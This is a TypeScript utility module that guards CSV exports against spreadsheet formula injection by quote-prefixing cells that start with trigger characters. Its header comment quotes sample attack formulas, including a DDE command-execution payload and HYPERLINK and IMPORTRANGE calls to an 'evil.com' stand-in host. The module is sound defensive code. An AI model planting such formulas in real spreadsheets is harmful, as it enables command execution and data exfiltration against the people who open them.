// CSV Formula Injection Protection
//
// When CSV files are opened in Excel, Google Sheets, or LibreOffice Calc,
// cells starting with certain characters are interpreted as formulas:
//   =  +  -  @  \t  \r  |
//
// An attacker who controls data fields (client name, event description, notes)
// could inject formulas like:
//   =HYPERLINK("http://evil.com","Click here")
//   =CMD|'/C calc'!A0
//   =IMPORTRANGE("http://evil.com/steal","A1:Z100")
//
// This module provides sanitization for all CSV exports.

const FORMULA_PREFIXES = new Set(['=', '+', '-', '@', '\t', '\r', '|'])

/**
 * Sanitize a string value for safe CSV output.
 * Prefixes dangerous characters with a single quote (') which Excel/Sheets
 * treat as a text-force prefix — the value is displayed without the quote
 * and is never executed as a formula.
 */
export function sanitizeCsvValue(value: string | number | null | undefined): string {
  if (value == null) return ''
  if (typeof value === 'number') return String(value)

  const str = String(value)
  if (str.length === 0) return ''

  // If the first character is a formula trigger, prefix with single quote
  if (FORMULA_PREFIXES.has(str[0])) {
    return `'${str}`
  }

  return str
}

/**
 * Escape and sanitize a value for CSV output.
 * Combines formula injection protection with standard CSV escaping
 * (quoting values that contain commas, quotes, or newlines).
 */
export function escapeCsvSafe(value: string | number | null | undefined): string {
  if (value == null) return ''
  if (typeof value === 'number') return String(value)

  let str = String(value)
  if (str.length === 0) return ''

  // Neutralize formula injection
  if (FORMULA_PREFIXES.has(str[0])) {
    str = `'${str}`
  }

  // Standard CSV escaping
  if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
    return `"${str.replace(/"/g, '""')}"`
  }

  return str
}

/**
 * Build a CSV row from an array of cell values, with formula injection protection.
 */
export function csvRowSafe(cells: (string | number | null | undefined)[]): string {
  return cells.map(escapeCsvSafe).join(',')
}

/**
 * Build a complete CSV string from headers and rows, with formula injection protection.
 */
export function buildCsvSafe(
  headers: string[],
  rows: (string | number | null | undefined)[][]
): string {
  return [headers.join(','), ...rows.map((row) => row.map(escapeCsvSafe).join(','))].join('\n')
}
